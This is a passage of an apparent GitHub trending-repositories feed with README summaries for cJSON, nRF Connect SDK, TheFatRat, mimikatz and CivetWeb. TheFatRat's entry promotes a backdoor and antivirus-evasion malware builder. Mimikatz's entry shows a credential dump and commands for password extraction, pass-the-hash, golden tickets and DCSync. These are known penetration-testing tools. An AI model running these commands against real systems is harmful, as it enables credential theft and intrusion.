&#xA;&lt;p&gt;cJSON supports parsing and printing JSON that contains objects that have multiple members with the same name. &lt;code&gt;cJSON_GetObjectItemCaseSensitive&lt;/code&gt; however will always only return the first one.&lt;/p&gt; &#xA;&lt;h1&gt;Enjoy cJSON!&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Dave Gamble (original author)&lt;/li&gt; &#xA; &lt;li&gt;Max Bruckner and Alan Wang (current maintainer)&lt;/li&gt; &#xA; &lt;li&gt;and the other &lt;a href=&#34;https://raw.githubusercontent.com/DaveGamble/cJSON/master/CONTRIBUTORS.md&#34;&gt;cJSON contributors&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>nrfconnect/sdk-nrf</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/nrfconnect/sdk-nrf</id>
    <link href="https://github.com/nrfconnect/sdk-nrf" rel="alternate"></link>
    <summary type="html">&lt;p&gt;nRF Connect SDK main repository&lt;/p&gt;&lt;hr&gt;&lt;p&gt;nRF Connect SDK: sdk-nrf ########################&lt;/p&gt; &#xA;&lt;p&gt;.. contents:: :local: :depth: 2&lt;/p&gt; &#xA;&lt;p&gt;This repository contains the Nordic-specific source code additions to open source projects (Zephyr RTOS and MCUboot). It must be combined with nrfxlib and the repositories that use the same naming convention to build the provided samples and to use the additional subsystems and libraries.&lt;/p&gt; &#xA;&lt;p&gt;The following repositories must be combined with sdk-nrf:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;sdk-zephyr&lt;/li&gt; &#xA; &lt;li&gt;sdk-mcuboot&lt;/li&gt; &#xA; &lt;li&gt;nrfxlib&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Documentation&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Official documentation at:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Latest: &lt;a href=&#34;http://developer.nordicsemi.com/nRF_Connect_SDK/doc/latest&#34;&gt;http://developer.nordicsemi.com/nRF_Connect_SDK/doc/latest&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;All versions: &lt;a href=&#34;http://developer.nordicsemi.com/nRF_Connect_SDK/doc/&#34;&gt;http://developer.nordicsemi.com/nRF_Connect_SDK/doc/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>screetsec/TheFatRat</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/screetsec/TheFatRat</id>
    <link href="https://github.com/screetsec/TheFatRat" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Thefatrat a massive exploiting tool : Easy tool to generate backdoor and easy tool to post exploitation attack like browser attack and etc . This tool compiles a malware with popular payload and then the compiled malware can be execute on windows, android, mac . The malware that created with this tool also have an ability to bypass most AV softw…&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;TheFatRat&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/TheFatRat-1.9.8-brightgreen.svg?maxAge=259200&#34; alt=&#34;Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Codename-Target-red.svg?maxAge=259200&#34; alt=&#34;Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Release-Testing-brightgreen.svg?sanitize=true&#34; alt=&#34;Stage&#34;&gt;&lt;/a&gt; &lt;a href=&#34;&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Supported_OS-Linux-orange.svg?sanitize=true&#34; alt=&#34;Build&#34;&gt;&lt;/a&gt; &lt;a href=&#34;&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Available-BlackArch-red.svg?maxAge=259200&#34; alt=&#34;Available&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/ManhNho/CEHv10/tree/master/Slides&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/CEHv10-eccouncil-blue.svg?maxAge=259200&#34; alt=&#34;Documentation&#34;&gt;&lt;/a&gt; &lt;a href=&#34;&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/contributions-welcome-blue.svg?style=flat&#34; alt=&#34;Contributions Welcome&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;A Massive Exploiting Tool&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/17976841/65820028-6ae17e00-e24e-11e9-894f-35836481cc2c.png&#34; alt=&#34;Banner&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;TheFatRat&lt;/strong&gt; is an exploiting tool which compiles a malware with famous payload, and then the compiled maware can be executed on Linux , Windows , Mac and Android. &lt;strong&gt;TheFatRat&lt;/strong&gt; Provides An Easy way to create Backdoors and Payload which can bypass most anti-virus.&lt;/p&gt; &#xA;&lt;h2&gt;Information&lt;/h2&gt; &#xA;&lt;p&gt;This tool is for educational purpose only, usage of TheFatRat for attacking targets without prior mutual consent is illegal. Developers assume no liability and are not responsible for any misuse or damage cause by this program.&lt;/p&gt; &#xA;&lt;h2&gt;Features !&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Fully Automating MSFvenom &amp;amp; Metasploit.&lt;/li&gt; &#xA; &lt;li&gt;Local or remote listener Generation.&lt;/li&gt; &#xA; &lt;li&gt;Easily Make Backdoor by category Operating System.&lt;/li&gt; &#xA; &lt;li&gt;Generate payloads in Various formats.&lt;/li&gt; &#xA; &lt;li&gt;Bypass anti-virus backdoors.&lt;/li&gt; &#xA; &lt;li&gt;File pumper that you can use for increasing the size of your files.&lt;/li&gt; &#xA; &lt;li&gt;The ability to detect external IP &amp;amp; Interface address .&lt;/li&gt; &#xA; &lt;li&gt;Automatically creates AutoRun files for USB / CDROM exploitation&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;But it&#39;s shit! And your implementation sucks!&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Yes, you&#39;re probably correct. Feel free to &#34;Not use it&#34; and there is a pull button to &#34;Make it better&#34;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Installation&lt;/h1&gt; &#xA;&lt;p&gt;Instructions on how to install &lt;em&gt;TheFatRat&lt;/em&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/Screetsec/TheFatRat.git&#xA;cd TheFatRat&#xA;chmod +x setup.sh &amp;amp;&amp;amp; ./setup.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Update&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd TheFatRat&#xA;./update &amp;amp;&amp;amp; chmod +x setup.sh &amp;amp;&amp;amp; ./setup.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Troubleshoot on TheFatRat&lt;/h3&gt; &#xA;&lt;p&gt;chk_tools script to use in case of problems in setup.sh of fatrat this script will check if everything is in the right version to run fatrat and will also provide you a solution for the problem&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd TheFatRat&#xA;chmod +x chk_tools &#xA;./chk_tools&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Tools Overview&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Front View&lt;/th&gt; &#xA;   &lt;th&gt;Sample Feature&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://cloud.githubusercontent.com/assets/17976841/25420100/9ee12cf6-2a80-11e7-8dfa-c2e3cfe71366.png&#34; alt=&#34;Index&#34;&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/17976841/65820886-91a4b200-e258-11e9-9a00-1e5905f6be16.jpg&#34; alt=&#34;f&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Documentation Available in Modules CEH v9 and V10 , Download source here &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/khanhnnvn/CEHv10/raw/master/Labs/CEHv10%20Module%2006%20System%20Hacking.pdf&#34;&gt;CEHv10 Module 06 System Hacking.pdf&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/khanhnnvn/CEHv10/raw/master/Labs/CEHv10%20Module%2017%20Hacking%20Mobile%20Platforms.pdf&#34;&gt;CEHv10 Module 17 Hacking Mobile Platforms.pdf&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Published in International Journal of Cyber-Security and Digital Forensics &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.researchgate.net/publication/323574673_MALWARE_ANALYSIS_OF_BACKDOOR_CREATOR_FATRAT&#34;&gt;Malware Analysis Of Backdoor Creator : TheFatRat&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Youtube Videos &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=FsSgJFxyzFQ&#34;&gt;How To Download &amp;amp; Install TheFatRat&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=NCsrcqhUBCc&amp;amp;feature=youtu.be&amp;amp;list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8&#34;&gt;TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package )&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=bFXVAXRXE9Q&#34;&gt;hacking windows 10 with TheFatRat&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=FlXMslSjnGw&#34;&gt;Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=lglOXojT84M&#34;&gt;Hacking with a Microsoft Office Word Document from TheFatRat&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=pbvg7pgxVjo&#34;&gt;XSS to powershell attack and bypass Antivirus using BeEF + TheFatRat + Metasploit&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=XLNigYZ5-fM&#34;&gt;TheFatRat - Hacking Over WAN - Embedding Payload in Original Android APK - Without Port Forwarding&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=C_Og6LnEZSg&#34;&gt;How To Automatically Embed Payloads In APK&#39;s - Evil-Droid, Thefatrat &amp;amp; Apkinjector&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=VPl1TMCAIy8&#34;&gt;Bind FUD Payload with JPG and Hack over WAN with TheFatRat&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Changelog&lt;/h2&gt; &#xA;&lt;p&gt;All notable changes to this project will be documented in this &lt;a href=&#34;https://github.com/Screetsec/thefatrat/raw/master/CHANGELOG.md&#34;&gt;file&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;About issues&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Read the &lt;a href=&#34;https://github.com/Screetsec/TheFatRat/raw/master/issues.md&#34;&gt;document&lt;/a&gt; before making an issue&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Alternative Best Tool - Generating Backdoor &amp;amp; Bypass&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Veil-Framework/Veil&#34;&gt;Veil-Framework /Veil&lt;/a&gt; - Veil Framework&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.shellterproject.com/download/&#34;&gt;Shellter&lt;/a&gt; - Shellter AV Evasion Artware&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/trustedsec/unicorn&#34;&gt;Unicorn&lt;/a&gt; - Trustedsec&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/g0tmi1k/msfpc&#34;&gt;MSFvenom Payload Creator (MSFPC)&lt;/a&gt; - g0tmi1k&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/r00t-3xp10it/venom&#34;&gt;Venom&lt;/a&gt; - Pedro Ubuntu&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/oddcod3/Phantom-Evasion&#34;&gt;Phantom-Evasion&lt;/a&gt; - Diego Cornacchini&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Credits &amp;amp; Thanks&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.offensive-security.com/&#34;&gt;Offensive Security&lt;/a&gt; - Offensive Security&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dracos-linux.org/&#34;&gt;dracOs Linux&lt;/a&gt; - Penetration Testing OS From Indonesia&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/peterpt&#34;&gt;peterpt&lt;/a&gt; - Maintainer &amp;amp; Contributor&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dana-at-cp/backdoor-apk&#34;&gt;Dana James Traversie&lt;/a&gt; - backdoor_apk&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/z0noxz/powerstager&#34;&gt;z0noxz&lt;/a&gt; - Powerstager&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/trustedsec/unicorn&#34;&gt;TrustedSec&lt;/a&gt; - Unicorn&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rsmudge&#34;&gt;Raphael Mudge&lt;/a&gt; - External Source&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://astr0baby.wordpress.com&#34;&gt;astr0baby&lt;/a&gt; - Reference Source&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ngesec.id/&#34;&gt;NgeSEC&lt;/a&gt; Community&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gauli.net/&#34;&gt;Gauli(dot)Net&lt;/a&gt; - Lab Penetration&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;TheFatRat is made with 🖤 by Edo Maland &amp;amp; All &lt;a href=&#34;https://github.com/Screetsec/TheFatRat/graphs/contributors&#34;&gt;Contributors&lt;/a&gt;. See the &lt;strong&gt;License&lt;/strong&gt; file for more details.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>gentilkiwi/mimikatz</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/gentilkiwi/mimikatz</id>
    <link href="https://github.com/gentilkiwi/mimikatz" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A little tool to play with Windows security&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;mimikatz&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;mimikatz&lt;/code&gt;&lt;/strong&gt; is a tool I&#39;ve made to learn &lt;code&gt;C&lt;/code&gt; and make somes experiments with Windows security.&lt;/p&gt; &#xA;&lt;p&gt;It&#39;s now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. &lt;strong&gt;&lt;code&gt;mimikatz&lt;/code&gt;&lt;/strong&gt; can also perform pass-the-hash, pass-the-ticket or build &lt;em&gt;Golden tickets&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  .#####.   mimikatz 2.0 alpha (x86) release &#34;Kiwi en C&#34; (Apr  6 2014 22:02:03)&#xA; .## ^ ##.&#xA; ## / \ ##  /* * *&#xA; ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )&#xA; &#39;## v ##&#39;   https://blog.gentilkiwi.com/mimikatz             (oe.eo)&#xA;  &#39;#####&#39;                                    with  13 modules * * */&#xA;&#xA;&#xA;mimikatz # privilege::debug&#xA;Privilege &#39;20&#39; OK&#xA; &#xA;mimikatz # sekurlsa::logonpasswords&#xA; &#xA;Authentication Id : 0 ; 515764 (00000000:0007deb4)&#xA;Session           : Interactive from 2&#xA;User Name         : Gentil Kiwi&#xA;Domain            : vm-w7-ult-x&#xA;SID               : S-1-5-21-1982681256-1210654043-1600862990-1000&#xA;        msv :&#xA;         [00000003] Primary&#xA;         * Username : Gentil Kiwi&#xA;         * Domain   : vm-w7-ult-x&#xA;         * LM       : d0e9aee149655a6075e4540af1f22d3b&#xA;         * NTLM     : cc36cf7a8514893efccd332446158b1a&#xA;         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30&#xA;        tspkg :&#xA;         * Username : Gentil Kiwi&#xA;         * Domain   : vm-w7-ult-x&#xA;         * Password : waza1234/&#xA;...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But that&#39;s not all! &lt;code&gt;Crypto&lt;/code&gt;, &lt;code&gt;Terminal Server&lt;/code&gt;, &lt;code&gt;Events&lt;/code&gt;, ... lots of informations in the GitHub Wiki &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki&#34;&gt;https://github.com/gentilkiwi/mimikatz/wiki&lt;/a&gt; or on &lt;a href=&#34;https://blog.gentilkiwi.com&#34;&gt;https://blog.gentilkiwi.com&lt;/a&gt; (in French, &lt;em&gt;yes&lt;/em&gt;).&lt;/p&gt; &#xA;&lt;p&gt;If you don&#39;t want to build it, binaries are availables on &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/releases&#34;&gt;https://github.com/gentilkiwi/mimikatz/releases&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Quick usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;log&#xA;privilege::debug&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;sekurlsa&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;sekurlsa::logonpasswords&#xA;sekurlsa::tickets /export&#xA;&#xA;sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;kerberos&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;kerberos::list /export&#xA;kerberos::ptt c:\chocolate.kirbi&#xA;&#xA;kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;crypto&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;crypto::capi&#xA;crypto::cng&#xA;&#xA;crypto::certificates /export&#xA;crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE&#xA;&#xA;crypto::keys /export&#xA;crypto::keys /machine /export&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;vault &amp;amp; lsadump&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code&gt;vault::cred&#xA;vault::list&#xA;&#xA;token::elevate&#xA;vault::cred&#xA;vault::list&#xA;lsadump::sam&#xA;lsadump::secrets&#xA;lsadump::cache&#xA;token::revert&#xA;&#xA;lsadump::dcsync /user:domain\krbtgt /domain:lab.local&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Build&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;mimikatz&lt;/code&gt; is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;for &lt;code&gt;mimikatz&lt;/code&gt; and &lt;code&gt;mimilib&lt;/code&gt; : Visual Studio 2010, 2012 or 2013 for Desktop (&lt;strong&gt;2013 Express for Desktop is free and supports x86 &amp;amp; x64&lt;/strong&gt; - &lt;a href=&#34;http://www.microsoft.com/download/details.aspx?id=44914&#34;&gt;http://www.microsoft.com/download/details.aspx?id=44914&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;for &lt;code&gt;mimikatz driver&lt;/code&gt;, &lt;code&gt;mimilove&lt;/code&gt; (and &lt;code&gt;ddk2003&lt;/code&gt; platform) : Windows Driver Kit &lt;strong&gt;7.1&lt;/strong&gt; (WinDDK) - &lt;a href=&#34;http://www.microsoft.com/download/details.aspx?id=11800&#34;&gt;http://www.microsoft.com/download/details.aspx?id=11800&lt;/a&gt;&lt;/em&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;code&gt;mimikatz&lt;/code&gt; uses &lt;code&gt;SVN&lt;/code&gt; for source control, but is now available with &lt;code&gt;GIT&lt;/code&gt; too! You can use any tools you want to sync, even incorporated &lt;code&gt;GIT&lt;/code&gt; in Visual Studio 2013 =)&lt;/p&gt; &#xA;&lt;h3&gt;Synchronize!&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;GIT URL is : &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz.git&#34;&gt;https://github.com/gentilkiwi/mimikatz.git&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;SVN URL is : &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/trunk&#34;&gt;https://github.com/gentilkiwi/mimikatz/trunk&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;ZIP file is : &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/archive/master.zip&#34;&gt;https://github.com/gentilkiwi/mimikatz/archive/master.zip&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Build the solution&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;After opening the solution, &lt;code&gt;Build&lt;/code&gt; / &lt;code&gt;Build Solution&lt;/code&gt; (you can change architecture)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;mimikatz&lt;/code&gt; is now built and ready to be used! (&lt;code&gt;Win32&lt;/code&gt; / &lt;code&gt;x64&lt;/code&gt; even &lt;code&gt;ARM64&lt;/code&gt; if you&#39;re lucky) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;you can have error &lt;code&gt;MSB3073&lt;/code&gt; about &lt;code&gt;_build_.cmd&lt;/code&gt; and &lt;code&gt;mimidrv&lt;/code&gt;, it&#39;s because the driver cannot be build without Windows Driver Kit &lt;strong&gt;7.1&lt;/strong&gt; (WinDDK), but &lt;code&gt;mimikatz&lt;/code&gt; and &lt;code&gt;mimilib&lt;/code&gt; are OK.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;ddk2003&lt;/h3&gt; &#xA;&lt;p&gt;With this optional MSBuild platform, you can use the WinDDK build tools, and the default &lt;code&gt;msvcrt&lt;/code&gt; runtime (smaller binaries, no dependencies)&lt;/p&gt; &#xA;&lt;p&gt;For this optional platform, Windows Driver Kit &lt;strong&gt;7.1&lt;/strong&gt; (WinDDK) - &lt;a href=&#34;http://www.microsoft.com/download/details.aspx?id=11800&#34;&gt;http://www.microsoft.com/download/details.aspx?id=11800&lt;/a&gt; and Visual Studio &lt;strong&gt;2010&lt;/strong&gt; are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.&lt;/p&gt; &#xA;&lt;p&gt;Follow instructions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme&#34;&gt;https://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader&#34;&gt;https://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader&lt;/a&gt;&lt;/em&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Continuous Integration&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;mimikatz&lt;/code&gt; project is available on AppVeyor - &lt;a href=&#34;https://ci.appveyor.com/project/gentilkiwi/mimikatz&#34;&gt;https://ci.appveyor.com/project/gentilkiwi/mimikatz&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Its status is: &lt;img src=&#34;https://ci.appveyor.com/api/projects/status/github/gentilkiwi/mimikatz?svg=true&amp;amp;retina=true&#34; alt=&#34;AppVeyor CI status&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Licence&lt;/h2&gt; &#xA;&lt;p&gt;CC BY 4.0 licence - &lt;a href=&#34;https://creativecommons.org/licenses/by/4.0/&#34;&gt;https://creativecommons.org/licenses/by/4.0/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;mimikatz&lt;/code&gt; needs coffee to be developed:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;PayPal: &lt;a href=&#34;https://www.paypal.me/delpy/&#34;&gt;https://www.paypal.me/delpy/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Author&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Benjamin DELPY &lt;code&gt;gentilkiwi&lt;/code&gt;, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )&lt;/li&gt; &#xA; &lt;li&gt;DCSync and DCShadow functions in &lt;code&gt;lsadump&lt;/code&gt; module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( &lt;a href=&#34;http://www.mysmartlogon.com&#34;&gt;http://www.mysmartlogon.com&lt;/a&gt; )&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This is a &lt;strong&gt;personal&lt;/strong&gt; development, please respect its philosophy and don&#39;t use it for bad things!&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>civetweb/civetweb</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/civetweb/civetweb</id>
    <link href="https://github.com/civetweb/civetweb" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Embedded C/C++ web server&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;img src=&#34;https://raw.githubusercontent.com/civetweb/civetweb/master/resources/civetweb_64x64.png&#34; alt=&#34;CivetWeb&#34; title=&#34;CivetWeb&#34;&gt; CivetWeb&lt;/h1&gt; &#xA;&lt;p&gt;&lt;strong&gt;The official home of CivetWeb is on GitHub &lt;a href=&#34;https://github.com/civetweb/civetweb&#34;&gt;https://github.com/civetweb/civetweb&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-MIT-brightgreen.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/CREDITS.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/contributors/civetweb/civetweb.svg?sanitize=true&#34; alt=&#34;GitHub contributors&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/civetweb/civetweb/stargazers&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/stars/civetweb/civetweb.svg?sanitize=true&#34; alt=&#34;Stargazers&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/civetweb/civetweb/network/members&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/forks/civetweb/civetweb.svg?sanitize=true&#34; alt=&#34;Forks&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/civetweb/civetweb/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/civetweb/civetweb.svg?sanitize=true&#34; alt=&#34;Latest Release&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Continuous integration for Linux and macOS (&lt;a href=&#34;https://app.travis-ci.com/github/civetweb/civetweb&#34;&gt;Travis CI&lt;/a&gt;):&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://app.travis-ci.com/github/civetweb/civetweb&#34;&gt;&lt;img 